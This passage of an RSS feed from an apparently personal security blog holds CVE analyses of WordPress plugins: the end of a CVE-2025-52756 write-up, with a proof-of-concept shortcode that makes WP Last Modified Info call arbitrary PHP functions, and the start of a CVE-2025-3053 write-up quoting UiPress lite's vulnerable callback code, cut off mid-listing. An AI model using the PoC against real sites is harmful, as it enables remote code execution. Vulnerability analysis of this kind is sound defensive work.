class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means the option must be enabled:&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Show Info on Frontend&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;graph&amp;ensp;TD&#xD;&#xA;A[&#34;Contributor&amp;ensp;adds&amp;ensp;shortcode&amp;ensp;[lmt-post-modified-info&amp;ensp;hide_archive=&#39;...&#39;]&amp;ensp;in&amp;ensp;post&#34;]&#xD;&#xA;--&gt;&amp;ensp;B[&#34;WordPress&amp;ensp;loads&amp;ensp;the&amp;ensp;post&amp;ensp;content&#34;]&#xD;&#xA;B&amp;ensp;--&gt;&amp;ensp;C[&#34;Shortcode::render($atts)&amp;ensp;is&amp;ensp;executed&#34;]&#xD;&#xA;C&amp;ensp;--&gt;&amp;ensp;D[&#34;$atts[&#39;hide_archive&#39;]&amp;ensp;is&amp;ensp;parsed&amp;ensp;and&amp;ensp;trimmed&amp;ensp;into&amp;ensp;list&amp;ensp;of&amp;ensp;callbacks&#34;]&#xD;&#xA;D&amp;ensp;--&gt;&amp;ensp;E[&#34;For&amp;ensp;each&amp;ensp;$callback&amp;ensp;in&amp;ensp;list&#34;]&#xD;&#xA;E&amp;ensp;--&gt;&amp;ensp;F{&#34;is_callable($callback)?&#34;}&#xD;&#xA;F&amp;ensp;--&gt;|Yes|&amp;ensp;G[&#34;Invoke&amp;ensp;$callback()&#34;]&lt;/pre&gt;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Use an &lt;strong&gt;Administrator&lt;/strong&gt; account to enable the &lt;code&gt;Show&amp;ensp;Info&amp;ensp;on&amp;ensp;Frontend&lt;/code&gt; option&lt;/li&gt;&#xA;&lt;li&gt;Log in as a &lt;strong&gt;Contributor&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Create a post containing the shortcode:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[lmt-post-modified-info&amp;ensp;hide_archive=phpinfo]&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Submit and preview the post.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-02-cve-2025-52756/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-02-cve-2025-52756/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-02-cve-2025-52756/result.png&#39; alt=&#34;Result&#34; height=&#34;808&#34; width=&#34;1237&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability in &lt;strong&gt;WP Last Modified Info &amp;lt;= 1.9.4&lt;/strong&gt; allows a &lt;strong&gt;Contributor&lt;/strong&gt; to inject a shortcode containing an arbitrary PHP function name in &lt;code&gt;hide_archive&lt;/code&gt;. These functions are checked with &lt;code&gt;is_callable()&lt;/code&gt; and then directly executed, leading to &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;. Version &lt;strong&gt;1.9.5&lt;/strong&gt; mitigates this by restricting calls to a predefined whitelist of safe functions.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Never call functions directly from user input, even when using &lt;code&gt;is_callable()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;If dynamic callbacks are required, always use a &lt;strong&gt;whitelist&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Shortcodes are a potential attack surface and must be carefully validated and permission-controlled.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wp-last-modified-info/vulnerability/wordpress-wp-last-modified-info-plugin-1-9-2-remote-code-execution-rce-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Last Modified Info Plugin &amp;lt;= 1.9.4 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-3053 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-01-cve-2025-3053/</link>
      <pubDate>Mon, 01 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-01-cve-2025-3053/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-01-cve-2025-3053/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;UiPress lite&lt;/strong&gt; | a plugin for easily creating &lt;strong&gt;custom dashboards&lt;/strong&gt;, &lt;strong&gt;admin themes&lt;/strong&gt;, and &lt;strong&gt;pages&lt;/strong&gt; for &lt;strong&gt;WordPress&lt;/strong&gt; contains a &lt;strong&gt;Remote Code Execution&lt;/strong&gt; vulnerability in all versions up to and including &lt;strong&gt;3.5.07&lt;/strong&gt; via the &lt;strong&gt;uip_process_form_input()&lt;/strong&gt; function. This is because the function takes &lt;strong&gt;user-supplied input&lt;/strong&gt; to execute &lt;strong&gt;arbitrary functions&lt;/strong&gt; with &lt;strong&gt;arbitrary data&lt;/strong&gt; and &lt;strong&gt;does not perform any capability checks&lt;/strong&gt;. This allows &lt;strong&gt;authenticated attackers&lt;/strong&gt;, with &lt;strong&gt;Subscriber-level&lt;/strong&gt; access or higher, to &lt;strong&gt;execute arbitrary code&lt;/strong&gt; on the &lt;strong&gt;server&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-3053&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-3053&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.5.07&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.5.08&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (8.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/uipress-lite/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress UiPress lite Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version â€“ UiPress lite&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.5.07&lt;/code&gt; â€“ &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.5.08&lt;/code&gt; â€“ &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; â†’ &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v3.5.07):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;uip_process_form_input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Check&amp;ensp;security&amp;ensp;nonce&amp;ensp;and&amp;ensp;&amp;#39;DOING_AJAX&amp;#39;&amp;ensp;global&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Ajax&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;check_referer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;json_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;stripslashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;formData&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Sanitize&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;clean_input_with_code&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$userFunction&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;userFunction&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;function_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$userFunction&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Ajax&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Passed&amp;ensp;function&amp;ensp;doesn\&amp;#39;t&amp;ensp;exist&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uipress-lite&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Try&amp;ensp;to&amp;ensp;start&amp;ensp;user&amp;ensp;supplied&amp;ensp;function&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$userFunction&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 